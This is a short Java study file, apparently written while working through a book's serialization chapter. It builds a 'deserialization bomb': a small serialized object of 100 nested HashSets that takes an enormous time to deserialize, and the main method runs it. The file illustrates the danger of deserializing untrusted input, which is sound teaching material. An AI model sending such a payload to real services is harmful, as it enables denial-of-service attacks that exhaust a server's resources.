package study.heejin.chapter12.item85;

import study.heejin.chapter12.Util;

import java.util.HashSet;
import java.util.Set;

public class DeserializationBomb {

    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length);
        Util.deserialize(bomb());
    }

    static byte[] bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();

            t1.add("foo");  // t1을 t2와 다르게 만든다.
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);

            s1 = t1;
            s2 = t2;
        }
        return Util.serialize(root);
    }
}
